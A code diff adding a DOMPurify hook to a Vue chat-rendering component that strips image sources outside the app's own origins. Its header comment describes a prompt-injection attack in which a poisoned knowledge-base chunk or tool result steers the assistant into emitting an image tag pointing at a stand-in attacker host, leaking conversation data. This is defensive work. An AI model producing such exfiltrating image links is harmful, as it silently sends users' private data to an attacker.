@@ -22,6 +22,61 @@ import markedKatex from 'marked-katex-extension';
 import { type Component, computed, nextTick, onMounted, onUnmounted, ref, watch } from 'vue';
 import EChartBlock from './EChartBlock.vue';
 
+/**
+ * Image-exfiltration guard.
+ *
+ * Assistant output is attacker-influenceable (a prompt-injected KB chunk or
+ * tool result can steer the model). DOMPurify already strips <script>/onerror,
+ * but it leaves <img src="https://attacker/?leak=…"> intact, and the browser
+ * auto-fetches it — a zero-click channel that exfiltrates conversation/PII to
+ * an attacker host (and fires again in the operator's dashboard). There is no
+ * img-src CSP on the widget surface to stop it.
+ *
+ * So we hard-restrict where rendered <img> may load from: same-origin, the
+ * canonical app origin (chunk images are absolute to the main domain even on
+ * an agent subdomain), and inline data: images (no network egress). Every other
+ * src is dropped. Registered once at module load; applies to every
+ * DOMPurify.sanitize() call in the app.
+ */
+const ALLOWED_IMG_ORIGINS = new Set<string>();
+if (typeof window !== 'undefined') {
+    ALLOWED_IMG_ORIGINS.add(window.location.origin);
+    const appUrl = document.querySelector('meta[name="app-url"]')?.getAttribute('content');
+    if (appUrl) {
+        try {
+            ALLOWED_IMG_ORIGINS.add(new URL(appUrl).origin);
+        } catch {
+            /* malformed meta — fall back to same-origin only */
+        }
+    }
+}
+
+DOMPurify.addHook('afterSanitizeAttributes', (node) => {
+    if (!(node instanceof Element) || node.tagName !== 'IMG') {
+        return;
+    }
+
+    const src = node.getAttribute('src') ?? '';
+
+    // Inline images make no network request, so they cannot exfiltrate.
+    if (src.startsWith('data:image/')) {
+        return;
+    }
+
+    let allowed = false;
+    try {
+        const url = new URL(src, window.location.origin);
+        allowed = (url.protocol === 'http:' || url.protocol === 'https:') && ALLOWED_IMG_ORIGINS.has(url.origin);
+    } catch {
+        allowed = false;
+    }
+
+    if (!allowed) {
+        node.removeAttribute('src');
+        node.removeAttribute('srcset');
+    }
+});
+
 const props = withDefaults(
     defineProps<{
         content: string;
